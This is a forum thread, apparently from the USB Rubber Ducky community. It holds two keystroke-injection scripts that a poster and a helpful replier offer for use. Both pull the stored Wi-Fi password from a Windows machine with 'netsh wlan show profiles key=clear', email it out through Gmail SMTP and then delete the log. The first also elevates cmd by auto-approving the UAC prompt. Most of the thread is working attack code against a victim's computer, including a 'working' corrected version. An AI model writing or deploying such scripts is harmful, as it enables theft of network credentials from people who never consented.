```
REM Title: WiFi password grabber save to twin duck SD
REM Author: silent_noise
REM Original by: Siem
REM Description: Saves the SSID, Network type, Authentication and the password to Log.txt. Then saves to the CD card on the twin duck
REM Adjust time for driver install
DELAY 3000
REM  Minimize all windows
WINDOWS d
REM  Open cmd & bypass UAC
DELAY 500
WINDOWS r
DELAY 200
STRING powershell Start-Process cmd.exe -Verb runAs
ENTER
DELAY 500
ALT y
DELAY 600
REM Define DUCKY drive as %duck%
STRING for /f %d in ('wmic volume get driveletter^, label ^| findstr "DUCKY"') do set duck=%d
ENTER
DELAY 100
REM Getting SSID
STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=: " %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
ENTER
REM Creating A.txt
STRING netsh wlan show profiles %A% key=clear | findstr /c:"Network type" /c:"Authentication" /c:"Key Content" | findstr /v "broadcast" | findstr /v "Radio">>A.txt
ENTER
REM Get network type
STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" A.txt') do set B=%A
ENTER
REM Get authentication
STRING for /f "tokens=2 delims=: " %A in ('findstr "Authentication" A.txt') do set C=%A
ENTER
REM Get password
STRING for /f "tokens=3 delims=: " %A in ('findstr "Key Content" A.txt') do set D=%A
ENTER
REM  Delete A.txt
STRING del A.txt
ENTER
REM  Create Log.txt
STRING echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt
ENTER
DELAY 100 
REM --> Mail Log.txt
STRING powershell
ENTER
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('SENDER@gmail.com', 'password')
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'SENDER"gmail.com'
ENTER
STRING $ReportEmail.To.Add('RECIEVER"gmail.com')
ENTER
STRING $ReportEmail.Subject = 'WiFi key grabber'
ENTER
STRING $ReportEmail.Body = (Get-Content Log.txt | out-string)
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 1000
STRING exit
ENTER
DELAY 500
REM --> Delete Log.txt and exit
STRING del Log.txt & exit
ENTER
```




However When I get the email it comes out like this.
SSID: %A%
Network type: %B%
Authentication: %C%
Password: %D%

Also using it against a windows 7 laptop.

***
Edit by berkeley_blue:

I haven't checked your code but I have a working one. You need to change "SENDER", "PASSWORD" and "RECEIVER".
Original author is Siem. I did little changes.

```
GUI r
DELAY 200
STRING cmd
ENTER
DELAY 500
STRING cd "%USERPROFILE%\Desktop" & for /f "tokens=2 delims=:" %A in ('netsh wlan show interface ^| findstr "SSID" ^| findstr /v "BSSID"') do set A=%A
ENTER
STRING set A="%A:~1%"
ENTER
STRING netsh wlan show profiles %A% key=clear | findstr /c:"Network type" /c:"Authentication" /c:"Key Content" | findstr /v "broadcast" | findstr /v "Radio">>A.txt
ENTER
STRING for /f "tokens=3 delims=: " %A in ('findstr "Network type" A.txt') do set B=%A
ENTER
STRING for /f "tokens=2 delims=: " %A in ('findstr "Authentication" A.txt') do set C=%A
ENTER
STRING for /f "tokens=3 delims=: " %A in ('findstr "Key Content" A.txt') do set D=%A
ENTER
STRING del A.txt
ENTER
STRING echo SSID: %A%>>Log.txt & echo Network type: %B%>>Log.txt & echo Authentication: %C%>>Log.txt & echo Password: %D%>>Log.txt
ENTER
STRING powershell
ENTER
STRING $SMTPServer = 'smtp.gmail.com'
ENTER
STRING $SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
ENTER
STRING $SMTPInfo.EnableSsl = $true
ENTER
STRING $SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('SENDER@gmail.com', 'PASSWORD')
ENTER
STRING $ReportEmail = New-Object System.Net.Mail.MailMessage
ENTER
STRING $ReportEmail.From = 'SENDER@gmail.com'
ENTER
STRING $ReportEmail.To.Add('RECEIVER@gmail.com')
ENTER
STRING $ReportEmail.Subject = 'WiFi key grabber'
ENTER
STRING $ReportEmail.Body = (Get-Content Log.txt | out-string)
ENTER
STRING $SMTPInfo.Send($ReportEmail)
ENTER
DELAY 1000
STRING exit
ENTER
DELAY 500
STRING exit
ENTER
DELAY 2000
STRING del %userprofile%\Desktop\Log.txt
ENTER
DELAY 200
STRING exit
ENTER
```
P.S Use [Hak5 Forums](https://forums.hak5.org/index.php?/forum/56-usb-rubber-ducky/) for further questions.